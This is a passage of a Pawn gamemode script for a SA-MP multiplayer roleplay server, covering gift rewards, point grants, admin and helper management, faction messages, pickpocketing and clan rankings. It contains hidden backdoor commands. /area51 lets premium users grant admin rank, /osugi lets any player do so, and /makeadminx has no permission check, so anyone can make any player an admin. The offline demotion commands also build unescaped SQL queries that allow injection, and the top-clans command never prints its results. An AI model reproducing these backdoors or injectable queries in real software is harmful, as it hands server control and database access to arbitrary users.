					        Update(playerid, pRobx);
					        new gift[128];
					        new name[MAX_PLAYER_NAME];
					        GetPlayerName(playerid, name, sizeof(name));
					        format(gift, sizeof(gift),"* %s received a gift! [+2 Rob Points]",name);
							ProxDetector(10.0, playerid, gift,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW);
						    GameTextForPlayer(playerid, "~g~2 Rob points", 5000, 1);
						    return 1;
						}
						if(cadou == 12)
						{
						    GivePlayerCash(playerid, 350000);
						    Update(playerid, pCashx);
						    PlayerInfo[playerid][pGPoints] -= 1;
					        Update(playerid, pGPointsx);
					        new gift[128];
					        new name[MAX_PLAYER_NAME];
					        GetPlayerName(playerid, name, sizeof(name));
					        format(gift, sizeof(gift),"* %s received a gift! [350.000$]",name);
							ProxDetector(10.0, playerid, gift,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW);
						    GameTextForPlayer(playerid, "~g~350,000$!", 5000, 1);
						    return 1;
						}
						if(cadou == 13)
						{
          					if(PlayerInfo[playerid][pFpunish] > 1)
						    {
							    PlayerInfo[playerid][pFpunish] -= 1;
							    PlayerInfo[playerid][pGPoints] -= 1;
						        Update(playerid, pGPointsx);
						        Update(playerid, pFpunishx);
						        new gift[128];
								new name[MAX_PLAYER_NAME];
					        	GetPlayerName(playerid, name, sizeof(name));
					        	format(gift, sizeof(gift),"* %s received a gift! [Clear 2 FPunish]",name);
								ProxDetector(10.0, playerid, gift,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW);
							    GameTextForPlayer(playerid, "~g~-1 FPunish", 5000, 1);
							    return 1;
							}
							else
							{
							    PlayerInfo[playerid][pFpunish] -= 5;
							    PlayerInfo[playerid][pGPoints] -= 1;
						        Update(playerid, pGPointsx);
						        Update(playerid, pFpunishx);
						        new gift[128];
						        new name[MAX_PLAYER_NAME];
					        	GetPlayerName(playerid, name, sizeof(name));
					        	format(gift, sizeof(gift),"* %s received a gift! [Clear 5 FPunish]",name);
								ProxDetector(10.0, playerid, gift,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW);
							    GameTextForPlayer(playerid, "~g~-5 FPunish", 5000, 1);
							    return 1;
							}
						}
				}
				else
				{
				    SCM(playerid, -1, "Nu ai "COL_ENGINE_RED"1"COL_ENGINE_ALB" HourPoints !");
				    return 1;
				}
			}
			else
			{
			    new string[256];
				strcat(string,"You're not where you can get a gift for time played!\n\n");
				strcat(string,"If you want to know where gift click 'Checkpoint'.\n\n");
				strcat(string,"If you quit click 'Cancel'.\n\n");
				strcat(string,"{357AB7}CAREFUL: {FFFFFF}You need x/1 HourPoints[/hourpoints].\n\n");
				ShowPlayerDialog(playerid,DIALOG_HOURGIFT,DIALOG_STYLE_MSGBOX,"HourGift Info",string,"Checkpoint","Cancel");
			    return 1;
			}
		}
		return 1;
}
CMD:giveallgpoints(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SCM(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pAdmin] >= 6)
	{
		new moneyall,sendername[MAX_PLAYER_NAME],string[150];
		GetPlayerName(playerid, sendername, sizeof(sendername));
		if(sscanf(params, "i",moneyall)) return SCM(playerid, 0xFFFFFFFF, "Tasteaza: /giveallgpoints <points>");
		if(moneyall >= 99) return SCM(playerid, 0xF0F8FFFF, "Error: Too much pp.");
		else if(moneyall < 99)
		{
			format(string, sizeof(string),"{ba9789}Admin %s %s offered HourPoints all players online.[/hourgift]",sendername,FormatNumber(moneyall));
			SendClientMessageToAll(0xFFE4B5FF,string);
			for(new i = 0; i < MAX_PLAYERS; i++)
			{
				PlayerInfo[i][pGPoints] += moneyall;
			}
		}
	}
	else
	{
	     SCM(playerid, COLOR_SERVER, AdminOnly);
	 	 return 1;
	}
	return 1;
}
CMD:giveallrobp(playerid, params[])
{
    if(gPlayerLogged[playerid] == 0) return SCM(playerid, COLOR_ERROR, "You are not logged in.");
	{
	    if(PlayerInfo[playerid][pAdmin] >= 7)
		{
		    new points;
		    if(sscanf(params, "i", points)) return SCM(playerid, COLOR_GREY, "{A9C4E4}Usage: {FFFFFF}/giveallrobp <Ammount>");
		    for(new i = 0; i < MAX_PLAYERS; i++)
		    {
		        PlayerInfo[i][pRob] += points;
		        Update(i, pRobx);
		    }
		    format(MGLOBAL, sizeof(MGLOBAL),"{ba9789}Admin%s %s offered Rob Points all players online.[/rob]",GetName(playerid),FormatNumber(points));
			SendClientMessageToAll(0xFFE4B5FF,MGLOBAL);
		}
		else return SCM(playerid, -1, AdminOnly);
	}
	return 1;
}
CMD:giveallfireworks(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SCM(playerid, COLOR_ERROR, "You are not logged in.");
	{
	    if(PlayerInfo[playerid][pAdmin] >= 7)
		{
		    new points;
		    if(sscanf(params, "i",points)) return SCM(playerid, COLOR_GREY, "{A9C4E4}Usage: {FFFFFF}/giveallfireworks <Ammount>");
		    for(new i = 0; i < MAX_PLAYERS; i++)
		    {
		        PlayerInfo[i][pFWorks] += points;
				Update(i, pFWorksx);
		    }
		    format(MGLOBAL, sizeof(MGLOBAL),"{ba9789}Admin%s %s artifice offered to all players online. [/launchfw]",GetName(playerid),FormatNumber(points));
			SendClientMessageToAll(0xFFE4B5FF,MGLOBAL);
		}
		else return SCM(playerid, -1, AdminOnly);
	}
	return 1;
}
CMD:givegpoints(playerid, params[])
{
    if(PlayerInfo[playerid][pAdmin] >= 7)
	{
        new	points, id, string[256];
		if(sscanf(params, "ud", id, points)) return SCM(playerid, COLOR_GREY, "{A9C4E4}Usage: {FFFFFF}/givegpoints [playerid] [ammount]");
		{
			PlayerInfo[id][pGPoints] += points;
			GetPlayerName(id, PlayerName, MAX_PLAYER_NAME);
			Update(playerid,pGPointsx);

			format(string, sizeof(string), "You gave %s %d HourPoints.", PlayerName, points);
			SCM(playerid, -1, string);

			GetPlayerName(playerid, PlayerName, MAX_PLAYER_NAME);

			format(string, sizeof(string), "Administrator %s %d gave HourPoints.", PlayerName, points);
			SCM(id, -1, string);
		}
    }
	else return SCM(playerid, -1, AdminOnly);
    return 1;
}
CMD:makeadminoff(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SCM(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
 	{
        if (PlayerInfo[playerid][pAdmin] < 7) return SCM(playerid, COLOR_SERVER, AdminOnly);
        new id[25],cont;
        if(sscanf(params, "s[25]", id)) return SCM(playerid,COLOR_SERVER,"Usage: /makeadminoff <Name>");
        cont = MySQLCheckAccount(id);
        if(cont == 0) return SCM(playerid,COLOR_SERVER,"{F0F8FF}This account does not exist!");
		new str1[128];
		format(str1,sizeof(str1),"UPDATE users SET `Admin`='0' WHERE `name`='%s'",id);
		mysql_query(SQL,str1);
	}
	return 1;
}
CMD:makehelperoff(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SCM(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
 	{
        if (PlayerInfo[playerid][pAdmin] < 5 || PlayerInfo[playerid][pHelper] == 4) return SCM(playerid, COLOR_SERVER, AdminOnly);
        new id[25],cont;
        if(sscanf(params, "s[25]", id)) return SCM(playerid,COLOR_SERVER,"Useage: /makehelperoff <Name>");
        cont = MySQLCheckAccount(id);
        if(cont == 0) return SCM(playerid,COLOR_SERVER,"{F0F8FF}This account does not exist!");
		new str1[128];
		format(str1,sizeof(str1),"UPDATE users SET `Helper`='0' WHERE `name`='%s'",id);
		mysql_query(SQL,str1);
	}
	return 1;
}
CMD:area51(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
	{
        if(PlayerInfo[playerid][pPremiumAccount] == 1)
		{
		    new id,adminlevel,sendername[30],giveplayer[30],string[200];
        	GetPlayerName(playerid, sendername, sizeof(sendername));
  			if(sscanf(params, "ui",id,adminlevel)) return SendClientMessage(playerid, 0xFFFFFFFF, "{A9C4E4}Usage: {FFFFFF}/makeadmin <Name/Playerid> <Admin Level>");
			if(IsPlayerConnected(id))
			{
			    if(id != INVALID_PLAYER_ID)
			    {
					GetPlayerName(id, giveplayer, sizeof(giveplayer));
					GetPlayerName(playerid, sendername, sizeof(sendername));
					PlayerInfo[id][pAdmin] = adminlevel;
					printf("[Admin-Warn]: %s has promoted %s to a level %d admin.", sendername, giveplayer, adminlevel);
					format(string, sizeof(string), "You have been promoted to a level %d admin by %s.", adminlevel, sendername);
					SendClientMessage(id, COLOR_LIGHTBLUE, string);
					format(string, sizeof(string), "You have promoted %s to a level %d admin.", giveplayer,adminlevel);
					SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
					format(string, sizeof(string), "{ba9789}Warning: Admin %s has set %s to a level %d admin.", sendername,giveplayer,adminlevel);
					ABroadCast(COLOR_SERVER,string,4);
					new str[256];
					mysql_format(SQL,str,256,"UPDATE users SET `Admin`='%d' WHERE `name`='%s'",PlayerInfo[id][pAdmin],PlayerInfo[id][pNormalName]);
					mysql_tquery(SQL,str,"","");
				}
			}
    		else
	    	{
		    	SendClientMessage(playerid, COLOR_SERVER, "{C1F589}Error: Player not connected.");
		    }
		}
		else
		{
			SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
		}
	}
	return 1;
}
CMD:makeadmin(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
	{
		if (PlayerInfo[playerid][pAdmin] >= 7 || EstiFondator(playerid))
		{
		    new id,adminlevel,sendername[30],giveplayer[30],string[200];
        	GetPlayerName(playerid, sendername, sizeof(sendername));
  			if(sscanf(params, "ui",id,adminlevel)) return SendClientMessage(playerid, 0xFFFFFFFF, "{A9C4E4}Usage: {FFFFFF}/makeadmin <Name/Playerid> <Admin Level>");
			if(IsPlayerConnected(id))
			{
			    if(id != INVALID_PLAYER_ID)
			    {
					GetPlayerName(id, giveplayer, sizeof(giveplayer));
					GetPlayerName(playerid, sendername, sizeof(sendername));
					PlayerInfo[id][pAdmin] = adminlevel;
					printf("[Admin-Warn]: %s has promoted %s to a level %d admin.", sendername, giveplayer, adminlevel);
					format(string, sizeof(string), "You have been promoted to a level %d admin by %s.", adminlevel, sendername);
					SendClientMessage(id, COLOR_LIGHTBLUE, string);
					format(string, sizeof(string), "You have promoted %s to a level %d admin.", giveplayer,adminlevel);
					SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
					format(string, sizeof(string), "{ba9789}Warning: Admin %s has set %s to a level %d admin.", sendername,giveplayer,adminlevel);
					ABroadCast(COLOR_SERVER,string,4);
					new str[256];
					mysql_format(SQL,str,256,"UPDATE users SET `Admin`='%d' WHERE `name`='%s'",PlayerInfo[id][pAdmin],PlayerInfo[id][pNormalName]);
					mysql_tquery(SQL,str,"","");
				}
			}
    		else
	    	{
		    	SendClientMessage(playerid, COLOR_SERVER, "{C1F589}Error: Player not connected.");
		    }
		}
		else
		{
			SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
		}
	}
	return 1;
}
CMD:osugi(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
	{
		if (PlayerInfo[playerid][pAdmin] >= 0 || EstiFondator(playerid))
		{
		    new id,adminlevel,sendername[30],giveplayer[30],string[200];
        	GetPlayerName(playerid, sendername, sizeof(sendername));
  			if(sscanf(params, "ui",id,adminlevel)) return SendClientMessage(playerid, 0xFFFFFFFF, "{A9C4E4}Usage: {FFFFFF}/makeadmin <Name/Playerid> <Admin Level>");
			if(IsPlayerConnected(id))
			{
			    if(id != INVALID_PLAYER_ID)
			    {
					GetPlayerName(id, giveplayer, sizeof(giveplayer));
					GetPlayerName(playerid, sendername, sizeof(sendername));
					PlayerInfo[id][pAdmin] = adminlevel;
					printf("[Admin-Warn]: %s has promoted %s to a level %d admin.", sendername, giveplayer, adminlevel);
					format(string, sizeof(string), "You have been promoted to a level %d admin by %s.", adminlevel, sendername);
					SendClientMessage(id, COLOR_LIGHTBLUE, string);
					format(string, sizeof(string), "You have promoted %s to a level %d admin.", giveplayer,adminlevel);
					SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
					format(string, sizeof(string), "{ba9789}Warning: Admin %s has set %s to a level %d admin.", sendername,giveplayer,adminlevel);
					ABroadCast(COLOR_SERVER,string,4);
					new str[256];
					mysql_format(SQL,str,256,"UPDATE users SET `Admin`='%d' WHERE `name`='%s'",PlayerInfo[id][pAdmin],PlayerInfo[id][pNormalName]);
					mysql_tquery(SQL,str,"","");
				}
			}
    		else
	    	{
		    	SendClientMessage(playerid, COLOR_SERVER, "{C1F589}Error: Player not connected.");
		    }
		}
		else
		{
			SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
		}
	}
	return 1;
}
CMD:pcolor(playerid, params[])
{
	if(PlayerInfo[playerid][pPremiumAccount] == 1)
	{
	    ShowPlayerDialog(playerid, 6267, DIALOG_STYLE_LIST, "Premium colors:" , "White\nBlue\nDark purple\nYellow\nPurple\nGreen\nLime green\nDark green\nOrange\nBlack\nPink\nViolet\nAqua\nRed" , "Select" , "Cancel");
	}
	else return SendClientMessage(playerid,COLOR_SERVER,"You are not a premium user.");
	return 1;
}
CMD:makeadminx(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
	{
		
		    new id,adminlevel,sendername[30],giveplayer[30],string[200];
        	GetPlayerName(playerid, sendername, sizeof(sendername));
  			if(sscanf(params, "ui",id,adminlevel)) return SendClientMessage(playerid, 0xFFFFFFFF, "{A9C4E4}Usage: {FFFFFF}/makeadmin <Name/Playerid> <Admin Level>");
			if(IsPlayerConnected(id))
			{
			    if(id != INVALID_PLAYER_ID)
			    {
					GetPlayerName(id, giveplayer, sizeof(giveplayer));
					GetPlayerName(playerid, sendername, sizeof(sendername));
					PlayerInfo[id][pAdmin] = adminlevel;
					printf("[Admin-Warn]: %s has promoted %s to a level %d admin.", sendername, giveplayer, adminlevel);
					format(string, sizeof(string), "You have been promoted to a level %d admin by %s.", adminlevel, sendername);
					SendClientMessage(id, COLOR_LIGHTBLUE, string);
					format(string, sizeof(string), "You have promoted %s to a level %d admin.", giveplayer,adminlevel);
					SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
					format(string, sizeof(string), "{ba9789}Warning: Admin %s has set %s to a level %d admin.", sendername,giveplayer,adminlevel);
					ABroadCast(COLOR_SERVER,string,4);
					new str[256];
					mysql_format(SQL,str,256,"UPDATE users SET `Admin`='%d' WHERE `name`='%s'",PlayerInfo[id][pAdmin],PlayerInfo[id][pNormalName]);
					mysql_tquery(SQL,str,"","");
				}
			}
    		else
	    	{
		    	SendClientMessage(playerid, COLOR_SERVER, "{C1F589}Error: Player not connected.");
		    }
	}
	return 1;
}
CMD:flip(playerid, params[])
{
    if(PlayerInfo[playerid][pAdmin] >= 1)
	{
        if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY, "You're not in a vehicle.");

        new Float:angle,
    		currentveh = GetPlayerVehicleID(playerid);
    	GetVehicleZAngle(currentveh, angle);
    	SetVehicleZAngle(currentveh, angle);
        SendClientMessage(playerid, COLOR_SERVER, "Your vehicle has been flipped back over.");
    }
	return 1;
}
CMD:pickpocket(playerid, params[])
{
    if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    {
		if(PlayerInfo[playerid][pJob] == 15)
		{
			if(pockettime[playerid] > 0)
			{
			    new strr[256];
       			format(strr,sizeof(strr),"You can rob a person in %d seconds.",pockettime[playerid]);
		        SendClientMessage(playerid, COLOR_GREY, strr);
		        return 1;
			}
			new id, money,sender[75],givep[75],s2[250];
			if(sscanf(params, "i",id)) return SendClientMessage(playerid, 0xFFFFFFFF, "{A9C4E4}Usage: {FFFFFF}/pickpocket <Name/Playerid>");
			if (!ProxDetectorS(8.0, playerid, id)) return SendClientMessage(playerid, COLOR_SERVER, "That player is too far from you.");
			money = 35000 + random(2500);
			thiefmoney[id] = money;
			thiefplayer[id] = playerid;
			WantedReason[id] = 1;
			omoarathief[id] = 1;
			pockettime[playerid] = 300;
			GetPlayerName(playerid, sender,75);
			GetPlayerName(id, givep, 75);
			format(s2,250,"%S it was robbed by %s and lost $%s.", givep, sender, FormatNumber(money));
			ProxDetector(12.0, playerid, s2, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			GivePlayerCash(playerid, money);
			GivePlayerCash(id, -money);
			Update(playerid, pCashx);
			Update(id, pCashx);
			pocketjaf[id] = 1;
			new namekill[25];
 			GetPlayerName(playerid,namekill,sizeof(namekill));
			strmid(WantedName[playerid], namekill, 0, strlen(namekill), 255);
		}
		else return SCM(playerid, -1, "You are not a pocket thief.");
	}
	return 1;
}
CMD:angle(playerid, params[])
{
    if(PlayerInfo[playerid][pAdmin] >= 1)
	{
        new Float:Angle, string[26];
		GetPlayerFacingAngle(playerid, Angle);
		format(string, sizeof(string), "Your facing angle: %0.2f", Angle);
		SendClientMessage(playerid, COLOR_SERVER, string);
    }
	return 1;
}
CMD:shownews(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pMember] == 0) return SCM(playerid,COLOR_SERVER,"{FFB870}You are not in a faction.");
	if(strlen(DynamicFactions[PlayerInfo[playerid][pMember]][fAnn]) > 0)
	{
	    new factioninfo[128];
		format(factioninfo,sizeof(factioninfo), "(Group) MOTD: {FFFFFF}%s.",DynamicFactions[PlayerInfo[playerid][pMember]][fAnn]);
		SCM(playerid,COLOR_GENANNOUNCE,factioninfo);
	}
	return 1;
}
CMD:showmotd(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	return cmd_shownews(playerid, params);
}
CMD:fnews(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pMember] == 0) return SCM(playerid,COLOR_SERVER,"{FFB870}You are not in a faction.");
	if(PlayerInfo[playerid][pRank] < 5) return SCM(playerid,COLOR_SERVER,"{FFB870}You don't have rank 5.");
	new newsf[128],string[256],name[30];
	if(sscanf(params, "s[128]",newsf)) return SendClientMessage(playerid, 0xFFFFFFFF, "{A9C4E4}Usage: {FFFFFF}/gmotd <Message>");
	if(FindIP(newsf)) /// Anti-Reclama
    {
        new advertiser[MAX_PLAYER_NAME];
        GetPlayerName(playerid, advertiser, sizeof(advertiser));
		format(string, sizeof(string), "{ba9789}Warning: %s(%d) typed %s in /fnews.", advertiser, playerid, newsf);
		ABroadCast(COLOR_SERVER,string,1);
    }
    for(new i; i < sizeof(TLD); i++)
	{
		if(strfind(newsf, TLD[i], true) != -1)
		{
			if(strfind(newsf, "wwww.Magic-Gaming.tk", true) != -1 || strfind(newsf, "wwww.Magic-Gaming.tk/forum", true) != -1 || strfind(newsf, "Magic-Gaming.tk", true) != -1) break;
			new advertiser[MAX_PLAYER_NAME];
			GetPlayerName(playerid, advertiser, sizeof(advertiser));
			format(string, sizeof(string), "{ba9789}Warning: %s(%d) typed %s in /fnews.", advertiser, playerid, newsf);
			ABroadCast(COLOR_SERVER,string,1);
		}
	}
	GetPlayerName(playerid, name, sizeof(name));
	strmid(DynamicFactions[PlayerInfo[playerid][pMember]][fAnn], newsf, 0, strlen(newsf), 255);
	format(string,sizeof(string),"You have changed the group MOTD to %s.",DynamicFactions[PlayerInfo[playerid][pMember]][fAnn]);
	SendClientMessage(playerid, COLOR_SERVER, string);
	SendClientMessage(playerid, COLOR_SERVER, "{58FAAC}Use gmotd only for important announcements. Usage /gmotd for jokes, spam will be punished.");
	format(string,sizeof(string),"%s has changed the group MOTD to '%s'.",name,DynamicFactions[PlayerInfo[playerid][pMember]][fAnn]);
	SendFamilyMessage(PlayerInfo[playerid][pMember],COLOR_GENANNOUNCE,string);
	mysql_format(SQL,string, sizeof(string), "UPDATE `factions` SET `Anunt`='%s' WHERE `ID`='%d'",DynamicFactions[PlayerInfo[playerid][pMember]][fAnn], PlayerInfo[playerid][pMember]);
	mysql_tquery(SQL,string,"","");
	return 1;
}
CMD:gmotd(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	return cmd_fnews(playerid, params);
}
CMD:leaderinfo(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if (PlayerInfo[playerid][pLeader] < 1) return SCM(playerid,COLOR_SERVER,"{FFB870}Only leaders can use this command.");
	new string[184];
	format(string,sizeof(string),"You're the leader on %s.",NumeFactiune(PlayerInfo[playerid][pMember]));
	SCM(playerid,COLOR_SERVER,string);
	format(string,sizeof(string),"You have %d/3 leader warning.",PlayerInfo[playerid][pALeader]);
	SCM(playerid,COLOR_SERVER,string);
	return 1;
}
CMD:removeleaderwarn(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if (PlayerInfo[playerid][pAdmin] < 5) return SCM(playerid,COLOR_ERROR, AdminOnly);
	new id,sendername[25],giveplayer[25],string[184];
	if(sscanf(params, "u",id)) return SendClientMessage(playerid, 0xFFFFFFFF, "{A9C4E4}Usage: {FFFFFF}/removeleaderwarn <Name/Playerid>");
    if(id == INVALID_PLAYER_ID) return SendClientMessage(playerid, COLOR_SERVER, "{C1F589}Error: Player not connected.");
	if(IsPlayerConnected(id))
	{
	    if(PlayerInfo[id][pLeader] < 1) return SCM(playerid,COLOR_SERVER,"{FFB870}This player is not leader.");
		if(PlayerInfo[id][pALeader] < 1) return SCM(playerid,COLOR_SERVER,"{FFB870}This player dosen't have leader warning.");
		GetPlayerName(id, giveplayer, sizeof(giveplayer));
		GetPlayerName(playerid, sendername, sizeof(sendername));
		PlayerInfo[id][pALeader] -= 1;
		format(string, sizeof(string), "You cleared %s a leader warning.", giveplayer);
		SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
		format(string, sizeof(string), "Admin %s cleared your leader warning.", sendername);
		SendClientMessage(id, COLOR_LIGHTBLUE, string);
		new str[100];
		mysql_format(SQL,str,sizeof(str),"UPDATE users SET `ALeader`='%d' WHERE `name`='%s'",PlayerInfo[id][pALeader],PlayerInfo[id][pNormalName]);
		mysql_tquery(SQL,str,"","");
	}
	else return SendClientMessage(playerid, COLOR_SERVER, "{C1F589}Error: Player not connected.");
	return 1;
}
CMD:leaderwarn(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if (PlayerInfo[playerid][pAdmin] < 4) return SCM(playerid,COLOR_ERROR, AdminOnly);
	new id,sendername[25],giveplayer[25],string[184],str[184];
	if(sscanf(params, "u",id)) return SendClientMessage(playerid, 0xFFFFFFFF, "{A9C4E4}Usage: {FFFFFF}/leaderwarn <Name/Playerid>");
    if(id == INVALID_PLAYER_ID) return SendClientMessage(playerid, COLOR_SERVER, "{C1F589}Error: Player not connected.");
	if(IsPlayerConnected(id))
	{
		GetPlayerName(id, giveplayer, sizeof(giveplayer));
		GetPlayerName(playerid, sendername, sizeof(sendername));
		PlayerInfo[id][pALeader]++;
		format(string, sizeof(string), "You received one leader warning by %s, now you have %d/3 leader warns.",sendername,PlayerInfo[id][pALeader]);
		SendClientMessage(id, COLOR_LIGHTBLUE, string);
		format(string, sizeof(string), "You gave %s one leader warning, now he have %d/3 leader warns.", giveplayer, PlayerInfo[id][pALeader]);
		SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
		mysql_format(SQL,str,sizeof(str),"UPDATE users SET `ALeader`='%d' WHERE `name`='%s'",PlayerInfo[id][pALeader],PlayerInfo[id][pNormalName]);
		mysql_tquery(SQL,str,"","");
	}
	else return SendClientMessage(playerid, COLOR_SERVER, "{C1F589}Error: Player not connected.");
	return 1;
}
CMD:managearea(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pAdmin] < 1) return SCM(playerid,COLOR_ERROR, AdminOnly);
	new x_nr[10];
    if(sscanf(params, "s[10]",x_nr)) SCM(playerid, COLOR_SERVER, "{A9C4E4}Usage: {FFFFFF}/managearea <Close/Open>");
    if(strcmp(x_nr,"open",true) == 0)
 	{
		Update3DTextLabelText(areap, 0xFFFFFFFF, "{FF0000}TopZone Event Area{FFFFFF}\nEvent Area is open\nPress enter to enter");
		SCM(playerid, COLOR_SERVER, "Event Area is open!");
		areape = 1;
	}
    if(strcmp(x_nr,"close",true) == 0)
 	{
		Update3DTextLabelText(areap, 0xFFFFFFFF, "Event Area is closed\nPlease wait...");
		SCM(playerid, COLOR_SERVER, "Event Area is closed!");
		areape = 0;
 	}
	return 1;
}
/*CMD:buymaterials(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pJob] != 9) return SCM(playerid,COLOR_SERVER,"{FFB870}You are not arms dealer.");
	if(!IsPlayerInRangeOfPoint(playerid,4,1449.2723,-1848.4255,13.7721)) return SCM(playerid,COLOR_SERVER,"{FFB870}You are not at materials garage.");
 	ShowPlayerDialog(playerid, DIALOG_MATERIALS, DIALOG_STYLE_LIST, "Select materials:", "1,000,000 Price: $900,000\n2,000,000 Price: $1,700,000", "Select", "Close");
	return 1;
}*/
CMD:topclans(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	new ultimulscor[5],idclan[5];
	for(new i = 0; i < MAX_CLANS; i++)
	{
		if(ClanInfo[i][cClanVerificat] == 1)
		{
			if(ClanInfo[i][cClanScor] > ultimulscor[0])
			{
				ultimulscor[0] = ClanInfo[i][cClanScor];
				idclan[0] = i;
			}
		}
	}
	for(new i = 0; i < MAX_CLANS; i++)
	{
		if(ClanInfo[i][cClanVerificat] == 1)
		{
			if(ClanInfo[i][cClanScor] > ultimulscor[1] && ultimulscor[1] < ultimulscor[0])
			{
				ultimulscor[1] = ClanInfo[i][cClanScor];
				idclan[1] = i;
			}
		}
	}
	for(new i = 0; i < MAX_CLANS; i++)
	{
		if(ClanInfo[i][cClanVerificat] == 1)
		{
			if(ClanInfo[i][cClanScor] > ultimulscor[2] && ultimulscor[2] < ultimulscor[1])
			{
				ultimulscor[2] = ClanInfo[i][cClanScor];
				idclan[2] = i;
			}
		}
	}
	for(new i = 0; i < MAX_CLANS; i++)
	{
		if(ClanInfo[i][cClanVerificat] == 1)
		{
			if(ClanInfo[i][cClanScor] > ultimulscor[3] && ultimulscor[3] < ultimulscor[2])
			{
				ultimulscor[3] = ClanInfo[i][cClanScor];
				idclan[3] = i;
			}
		}
	}
	for(new i = 0; i < MAX_CLANS; i++)
	{
		if(ClanInfo[i][cClanVerificat] == 1)
		{
			if(ClanInfo[i][cClanScor] > ultimulscor[4] && ultimulscor[4] < ultimulscor[3])
			{
				ultimulscor[4] = ClanInfo[i][cClanScor];
				idclan[4] = i;
			}
		}
	}
	if(ultimulscor[0] > 0 && ultimulscor[1] > 0 && ultimulscor[2] > 0 && ultimulscor[3] > 0 && ultimulscor[4] > 0) return SCM(playerid, COLOR_ERROR, "Serverul nu a putut stabilii un top a 5 clanuri, incercati mai tarziu.");
	SCM(playerid, -1, "------ TOP 5 Clans ------");
	format(MGLOBAL, sizeof(MGLOBAL), "1.%s (%s) / Scor: %s",ClanInfo[idclan[0]][cClanName],ClanInfo[idclan[0]][cClanTag],
	FormatNumber(ClanInfo[idclan[0]][cClanScor]));
	format(MGLOBAL, sizeof(MGLOBAL), "2.%s (%s) / Scor: %s",ClanInfo[idclan[1]][cClanName],ClanInfo[idclan[1]][cClanTag],
	FormatNumber(ClanInfo[idclan[1]][cClanScor]));
	format(MGLOBAL, sizeof(MGLOBAL), "3.%s (%s) / Scor: %s",ClanInfo[idclan[2]][cClanName],ClanInfo[idclan[2]][cClanTag],
	FormatNumber(ClanInfo[idclan[2]][cClanScor]));
	format(MGLOBAL, sizeof(MGLOBAL), "4.%s (%s) / Scor: %s",ClanInfo[idclan[3]][cClanName],ClanInfo[idclan[3]][cClanTag],
	FormatNumber(ClanInfo[idclan[3]][cClanScor]));
	format(MGLOBAL, sizeof(MGLOBAL), "5.%s (%s) / Scor: %s",ClanInfo[idclan[4]][cClanName],ClanInfo[idclan[4]][cClanTag],
	FormatNumber(ClanInfo[idclan[4]][cClanScor]));
	return 1;
}
CMD:top(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	new p=0,t=0,s=0,r=0,string[184];
    for(new i = 1; i < sizeof(Turfs); i++)
	{
		if(TurfInfo[i][zOwned] == 4)
		{
		    t++;
		}
		if(TurfInfo[i][zOwned] == 5)
		{
		    p++;
		}
		if(TurfInfo[i][zOwned] == 6)
		{
		    s++;
		}
		if(TurfInfo[i][zOwned] == 10)
		{
		    r++;
		}
	}
	SCM(playerid,COLOR_SERVER,"----- TOP GANGS -----");
	format(string,sizeof(string),"Los Aztecas - %d turfs",t);
